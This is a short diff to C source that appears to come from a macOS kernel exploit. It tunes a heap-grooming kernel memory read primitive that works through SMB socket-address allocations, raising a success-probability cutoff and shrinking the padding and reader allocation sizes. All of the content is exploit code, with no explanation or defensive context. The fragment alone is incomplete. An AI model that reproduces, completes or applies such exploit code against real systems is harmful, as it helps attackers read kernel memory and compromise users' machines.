@@ -33,7 +33,7 @@
 #define SMB_NUM_CLEANUP_ATTEMPTS 16
 
 #define NUM_SAMPLES_FOR_PROBABILITY 50
-#define CUTOFF_PROBABILITY 0.9
+#define CUTOFF_PROBABILITY 0.95
 
 
 struct kmem_zkext_neighbor_reader {
@@ -53,9 +53,9 @@ void kmem_neighbor_reader_init_saddr_allocators(kmem_zkext_neighour_reader_t rea
     xe_assert(reader->pad_start_allocator == NULL);
     xe_assert(reader->reader_allocator == NULL);
     xe_assert(reader->pad_end_allocator == NULL);
-    reader->pad_start_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 8);
-    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 72);
-    reader->pad_end_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 8);
+    reader->pad_start_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 4);
+    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 28);
+    reader->pad_end_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 4);
 }
 
 kmem_zkext_neighour_reader_t kmem_zkext_neighbor_reader_create(const struct sockaddr_in* smb_addr) {
@@ -143,7 +143,7 @@ int kmem_zkext_neighbor_reader_read(kmem_zkext_neighour_reader_t reader, uint8_t
     
     for (int i=0; i<MAX_TRIES; i++) {
         double probability = kmem_zkext_neighbor_reader_check(reader, zone_size, zone_size * 2);
-        if (probability < 0.95) {
+        if (probability < CUTOFF_PROBABILITY) {
             xe_log_debug("skipping read due to low success probability of %.2f", probability);
             continue;
         }
